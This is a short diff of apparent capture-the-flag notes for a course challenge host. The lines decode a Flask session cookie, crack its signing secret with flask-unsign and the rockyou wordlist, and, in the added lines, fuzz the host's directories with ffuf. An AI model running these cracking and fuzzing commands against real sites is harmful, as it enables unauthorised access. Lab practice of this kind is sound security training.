@@ -7,3 +7,6 @@ echo 'eyJjc3JmIjoiUm9tMmZ0Y0dqUGpiUEh6XzhGclUySmFGcUl0bUVlb3cifQ' | base64 -d
 flask-unsign --unsign --cookie 'eyJjc3JmIjoiUm9tMmZ0Y0dqUGpiUEh6XzhGclUySmFGcUl0bUVlb3cifQ.asp2kQ.wfTretAQPaWOGQXWpGmiQo8dOgI' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
 
 gunzip -k /usr/share/wordlists/rockyou.txt.gz
+
+
+ffuf -u "https://chl-d73b6cce-cd37-497d-9a3a-e25236133bb4-analisis-tps.softwareseguro.com.ar/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,302,403 -t 50
